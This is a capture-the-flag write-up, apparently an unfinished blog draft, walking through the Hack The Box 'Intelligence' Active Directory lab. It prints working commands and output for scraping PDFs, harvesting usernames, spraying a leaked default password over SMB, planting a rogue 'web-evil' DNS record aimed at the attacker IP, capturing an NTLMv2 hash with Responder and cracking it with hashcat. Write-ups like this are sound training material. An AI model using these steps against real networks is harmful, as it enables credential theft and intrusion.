---
layout: post
title:  "Hack The Box - Intelligence - Writeup"
date:   2000-01-01 07:00:00 +0200
tags: ["Hack The Box","OSCP"]
---
{% assign imgDir="HTB-Intelligence-Writeup" %}

# Introduction
The hack the box machine "Intelligence" is a medium machine which is included in [TJnull's OSCP Preparation List](). Exploiting this machine requires knowledge in the areas of 

<img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">

By enumerating the target, it is possible to discover 

# Exploitation
We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.85`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that 

<!-- ![nmap](/assets/{{ imgDir }}/nmap.png) -->

We notice DNS, LDAP, rpc
{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@sudo nmap -sSCV -p- 10.10.10.248@@
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-10 03:00 EDT
Nmap scan report for intelligence.htb (10.10.10.248)
Host is up (0.047s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
@@@53/tcp    open  domain@@@        Simple DNS Plus
@@@80/tcp    open  http@@@          Microsoft IIS httpd 10.0
|_http-title: Intelligence
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
@@@88/tcp    open  kerberos-sec@@@  Microsoft Windows Kerberos (server time: 2022-04-10 14:02:42Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
@@@389/tcp   open  ldap@@@          Microsoft Windows Active Directory LDAP (@@@Domain: intelligence.htb0@@@., Site: Default-First-Site-Name)
|_ssl-date: 2022-04-10T14:04:14+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:@@@dc.intelligence.htb@@@
| Not valid before: 2022-04-10T11:11:32
|_Not valid after:  2023-04-10T11:11:32
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
@@@636/tcp   open  ssl/ldap@@@      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-04-10T14:04:13+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2022-04-10T11:11:32
|_Not valid after:  2023-04-10T11:11:32
@@@3268/tcp  open  ldap@@@          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-04-10T14:04:14+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2022-04-10T11:11:32
|_Not valid after:  2023-04-10T11:11:32
@@@3269/tcp  open  ssl/ldap@@@      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-04-10T14:04:13+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2022-04-10T11:11:32
|_Not valid after:  2023-04-10T11:11:32
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
55415/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2022-04-10T14:03:33
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 252.47 seconds
{% endhighlight %}

{% highlight python linenos %}
import datetime, requests

#Parameters
baseURL = "http://10.10.10.248/"
start = datetime.datetime(2019,1,1)
stop = datetime.datetime(2022,1,1)

# Create a list of dates between the start and stop date
numdays = (stop - start).days
dates = [start + datetime.timedelta(days=ndays) for ndays in range(numdays)]
dates = [date.strftime("%Y-%m-%d") for date in dates]

# Attempt to download a PDF for each date
for date in dates:
	print(date, end="\r")
	URL = baseURL+"documents/"+date+"-upload.pdf"
	response = requests.get(URL)

	if response.status_code == 200:
		filename = "./"+date+".pdf"
		print("[*] PDF Found! Downloading " + URL + " to " + filename)
		with open(filename, 'wb') as f:
		    f.write(response.content)
{% endhighlight %}

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@python3 downloadPDFs.py@@
[*] PDF Found! Downloading http://10.10.10.248/documents/2020-01-01-upload.pdf to ./2020-01-01.pdf
[*] PDF Found! Downloading http://10.10.10.248/documents/2020-01-02-upload.pdf to ./2020-01-02.pdf
[*] PDF Found! Downloading http://10.10.10.248/documents/2020-01-04-upload.pdf to ./2020-01-04.pdf
[*] PDF Found! Downloading http://10.10.10.248/documents/2020-01-10-upload.pdf to ./2020-01-10.pdf
[*] PDF Found! Downloading http://10.10.10.248/documents/2020-01-20-upload.pdf to ./2020-01-20.pdf
[*] PDF Found! Downloading http://10.10.10.248/documents/2020-01-22-upload.pdf to ./2020-01-22.pdf
[*] PDF Found! Downloading http://10.10.10.248/documents/2020-01-23-upload.pdf to ./2020-01-23.pdf
[*] PDF Found! Downloading http://10.10.10.248/documents/2020-01-25-upload.pdf to ./2020-01-25.pdf
[...]
[*] PDF Found! Downloading http://10.10.10.248/documents/2021-02-25-upload.pdf to ./2021-02-25.pdf
[*] PDF Found! Downloading http://10.10.10.248/documents/2021-03-01-upload.pdf to ./2021-03-01.pdf
[*] PDF Found! Downloading http://10.10.10.248/documents/2021-03-07-upload.pdf to ./2021-03-07.pdf
[*] PDF Found! Downloading http://10.10.10.248/documents/2021-03-10-upload.pdf to ./2021-03-10.pdf
[*] PDF Found! Downloading http://10.10.10.248/documents/2021-03-18-upload.pdf to ./2021-03-18.pdf
[*] PDF Found! Downloading http://10.10.10.248/documents/2021-03-21-upload.pdf to ./2021-03-21.pdf
[*] PDF Found! Downloading http://10.10.10.248/documents/2021-03-25-upload.pdf to ./2021-03-25.pdf
[*] PDF Found! Downloading http://10.10.10.248/documents/2021-03-27-upload.pdf to ./2021-03-27.pdf
                                                                                                                    
┌──(kali㉿kali)-[/tmp/x]
└─$ 
{% endhighlight %}

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@ls@@
2020-01-01.pdf  2020-03-05.pdf  2020-05-21.pdf  2020-06-28.pdf  2020-09-06.pdf  2020-11-13.pdf  2021-02-21.pdf
2020-01-02.pdf  2020-03-12.pdf  2020-05-24.pdf  2020-06-30.pdf  2020-09-11.pdf  2020-11-24.pdf  2021-02-25.pdf
2020-01-04.pdf  2020-03-13.pdf  2020-05-29.pdf  2020-07-02.pdf  2020-09-13.pdf  2020-11-30.pdf  2021-03-01.pdf
2020-01-10.pdf  2020-03-17.pdf  2020-06-02.pdf  2020-07-06.pdf  2020-09-16.pdf  2020-12-10.pdf  2021-03-07.pdf
2020-01-20.pdf  2020-03-21.pdf  2020-06-03.pdf  2020-07-08.pdf  2020-09-22.pdf  2020-12-15.pdf  2021-03-10.pdf
2020-01-22.pdf  2020-04-02.pdf  2020-06-04.pdf  2020-07-20.pdf  2020-09-27.pdf  2020-12-20.pdf  2021-03-18.pdf
2020-01-23.pdf  2020-04-04.pdf  2020-06-07.pdf  2020-07-24.pdf  2020-09-29.pdf  2020-12-24.pdf  2021-03-21.pdf
2020-01-25.pdf  2020-04-15.pdf  2020-06-08.pdf  2020-08-01.pdf  2020-09-30.pdf  2020-12-28.pdf  2021-03-25.pdf
2020-01-30.pdf  2020-04-23.pdf  2020-06-12.pdf  2020-08-03.pdf  2020-10-05.pdf  2020-12-30.pdf  2021-03-27.pdf
2020-02-11.pdf  2020-05-01.pdf  2020-06-14.pdf  2020-08-09.pdf  2020-10-19.pdf  2021-01-03.pdf  downloadPDFs.py
2020-02-17.pdf  2020-05-03.pdf  2020-06-15.pdf  2020-08-19.pdf  2020-11-01.pdf  2021-01-14.pdf
2020-02-23.pdf  2020-05-07.pdf  2020-06-21.pdf  2020-08-20.pdf  2020-11-03.pdf  2021-01-25.pdf
2020-02-24.pdf  2020-05-11.pdf  2020-06-22.pdf  2020-09-02.pdf  2020-11-06.pdf  2021-01-30.pdf
2020-02-28.pdf  2020-05-17.pdf  2020-06-25.pdf  2020-09-04.pdf  2020-11-10.pdf  2021-02-10.pdf
2020-03-04.pdf  2020-05-20.pdf  2020-06-26.pdf  2020-09-05.pdf  2020-11-11.pdf  2021-02-13.pdf

┌──(kali㉿kali)-[/tmp/x]
└─$ exiftool 2020-01-01.pdf       
ExifTool Version Number         : 12.40
File Name                       : 2020-01-01.pdf
Directory                       : .
File Size                       : 26 KiB
File Modification Date/Time     : 2022:04:10 03:35:58-04:00
File Access Date/Time           : 2022:04:10 03:35:59-04:00
File Inode Change Date/Time     : 2022:04:10 03:35:58-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
@@@Creator@@@                         : @@@William.Lee@@@
                                                                                                
┌──(kali㉿kali)-[/tmp/x]
└─$ @@exiftool *.pdf | grep "Creator"@@
Creator                         : @@@William.Lee@@@
Creator                         : @@@Scott.Scott@@@
Creator                         : @@@Jason.Wright@@@
Creator                         : @@@Veronica.Patel@@@
[...]
Creator                         : @@@Jose.Williams@@@
Creator                         : @@@Veronica.Patel@@@
Creator                         : @@@Ian.Duncan@@@
Creator                         : @@@Richard.Williams@@@
                                                                                                                    
┌──(kali㉿kali)-[/tmp/x]
└─$ 
{% endhighlight %}


{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@exiftool *.pdf | grep "Creator" | awk -F ":" '{gsub(/ /,""); print $2}' > users.txt@@
                                                                                                                    
┌──(kali㉿kali)-[/tmp/x]
└─$ @@head users.txt@@
William.Lee
Scott.Scott
Jason.Wright
Veronica.Patel
Jennifer.Thomas
Danny.Matthews
David.Reed
Stephanie.Young
Daniel.Shelton
Jose.Williams
                                                                                                                    
┌──(kali㉿kali)-[/tmp/x]
└─$
{% endhighlight %}

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@abiword --to=txt --to-name=fd://1 2020-01-01.pdf@@
Dolore ut etincidunt adipisci aliquam labore.
Dolore quaerat porro neque amet. Non ipsum quiquia ut dolor modi porro.
Magnam dolor dolor etincidunt magnam adipisci etincidunt magnam. Aliquam
eius ipsum sed amet dolorem voluptatem. Dolore tempora magnam tempora
est ipsum. Modi etincidunt consectetur porro numquam eius magnam velit.
Est consectetur non tempora velit sed labore. Velit sed labore voluptatem est
tempora. Magnam etincidunt consectetur sed dolorem amet labore.
Adipisci est eius voluptatem. Adipisci sed dolorem ut etincidunt non etincidunt
numquam. Quisquam sit tempora voluptatem. Numquam ut dolore consectetur dolor quaerat quisquam. Tempora dolorem dolore dolore etincidunt modi.
Magnam aliquam quisquam porro. Modi est ut numquam dolor dolorem neque.


                                                                                                                    
┌──(kali㉿kali)-[/tmp/x]
└─$ @@abiword --to=txt --to-name=fd://1 *.pdf | grep -C 5 "password"@@


Sit porro tempora porro etincidunt adipisci.


New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default @@@password@@@ of:
@@@NewIntelligenceCorpUser9876@@@
After logging in please change your @@@password@@@ as soon as possible.


Dolor quisquam aliquam amet numquam modi.
Sit porro tempora sit adipisci porro sit quiquia. Ut dolor modi magnam ipsum
velit magnam. Ipsum ut numquam tempora sit. Tempora eius est voluptatem.
Dolorem numquam consectetur etincidunt etincidunt sed. Neque magnam ipsum modi sit aliquam amet. Amet consectetur modi quisquam adipisci aliquam
                                                                                                                    
┌──(kali㉿kali)-[/tmp/x]
└─$
{% endhighlight %}

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@crackmapexec smb 10.10.10.248 -u users.txt -p NewIntelligenceCorpUser9876@@                      
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [@@@+@@@] @@@intelligence.htb\Tiffany.Molina@@@:@@@NewIntelligenceCorpUser9876@@@ 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[/tmp/x]
└─$
{% endhighlight %}

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares@@
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.10.10.248    445    DC               [+] Enumerated shares
SMB         10.10.10.248    445    DC               Share           Permissions     Remark
SMB         10.10.10.248    445    DC               -----           -----------     ------
SMB         10.10.10.248    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.248    445    DC               C$                              Default share
SMB         10.10.10.248    445    DC               IPC$            READ            Remote IPC
SMB         10.10.10.248    445    DC               @@@IT@@@              @@@READ@@@            
SMB         10.10.10.248    445    DC               @@@NETLOGON@@@        @@@READ@@@            Logon server share 
SMB         10.10.10.248    445    DC               @@@SYSVOL@@@          @@@READ@@@            Logon server share 
SMB         10.10.10.248    445    DC               @@@Users@@@           @@@READ@@@            
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[/tmp/x]
└─$ @@smbclient \\\\10.10.10.248\\IT -U Tiffany.Molina%NewIntelligenceCorpUser9876@@         
Try "help" to get a list of possible commands.
smb: \> @@ls@@
  .                                   D        0  Sun Apr 18 20:50:55 2021
  ..                                  D        0  Sun Apr 18 20:50:55 2021
  @@@downdetector.ps1@@@                    A     1046  Sun Apr 18 20:50:55 2021

                3770367 blocks of size 4096. 1447069 blocks available
smb: \> @@get downdetector.ps1@@
@@@getting file \downdetector.ps1 of size 1046 as downdetector.ps1@@@ (3.1 KiloBytes/sec) (average 3.1 KiloBytes/sec)
smb: \> @@exit
{% endhighlight %}@@

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@file downdetector.ps1@@
downdetector.ps1: @@@Unicode text, UTF-16, little-endian text, with CRLF, LF line terminators@@@
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[/tmp/x]
└─$ @@dos2unix downdetector.ps1@@
dos2unix: @@@converting UTF-16LE file downdetector.ps1 to UTF-8 Unix format@@@...
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[/tmp/x]
└─$ @@nano downdetector.ps1@@
{% endhighlight %}

{% highlight powershell linenos %}
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
	try {
		$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
		if(.StatusCode -ne 200) {
			Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
		}
	} catch {}
}
{% endhighlight %}
We see that it sends a request to all DNS records starting with "web". 

https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@wget https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/dnstool.py@@
--2022-04-10 05:42:14--  https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/dnstool.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20261 (20K) [text/plain]
Saving to: ‘dnstool.py’

dnstool.py                                                 100%[========================================================================================================================================>]  19.79K  --.-KB/s    in 0.003s  

2022-04-10 05:42:15 (6.25 MB/s) - ‘@@@dnstool.py@@@’ @@@saved@@@ [20261/20261]

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[/tmp/x]
└─$ @@python3 dnstool.py -u intelligence\\Tiffany.Molina -p NewIntelligenceCorpUser9876 --action add --record web-evil --data 10.10.16.4 --type A 10.10.10.248@@    
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] @@@Adding new record@@@
[+] @@@LDAP operation completed successfully@@@
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[/tmp/x]
└─$ 
{% endhighlight %}

{% highlight none linenos %}                                              
┌──(kali㉿kali)-[/tmp/x]
└─$ @@sudo responder -I tun0@@
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.4]
    Responder IPv6             [dead:beef:4::1002]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-7BSHVOOOKON]
    Responder Domain Name      [WYSN.LOCAL]
    Responder DCE-RPC Port     [49652]

[+] Listening for events...                                            

[HTTP] NTLMv2 Client   : ::ffff:10.10.10.248
[HTTP] NTLMv2 @@@Username@@@ : @@@intelligence\Ted.Graves@@@
[HTTP] NTLMv2 @@@Hash@@@     : @@@Ted.Graves::intelligence:1c47423e00010562:C83C77FCFC30BAF8877ED75A4D91B2AB:010100000000000027681B87FA4CD801AC8DD0EFE91FC03300000000020008005700590053004E0001001E00570049004E002D00370042005300480056004F004F004F004B004F004E00040014005700590053004E002E004C004F00430041004C0003003400570049004E002D00370042005300480056004F004F004F004B004F004E002E005700590053004E002E004C004F00430041004C00050014005700590053004E002E004C004F00430041004C000800300030000000000000000000000000200000D2ABF102A325442058319BD8B1CC36A197486CE75252F9AD0CB436C324745E6A0A0010000000000000000000000000000000000009003C0048005400540050002F007700650062002D006500760069006C002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000@@@
{% endhighlight %}

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt@@
hashcat (v6.2.5) starting
[...]
@@@TED.GRAVES@@@::intelligence:1c47423e00010562:c83c[...]0000:@@@Mr.Teddy@@@
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: TED.GRAVES::intelligence:1c47423e00010562:c83c77fcf...000000
Time.Started.....: Sun Apr 10 05:50:32 2022 (10 secs)
Time.Estimated...: Sun Apr 10 05:50:42 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1102.9 kH/s (1.25ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
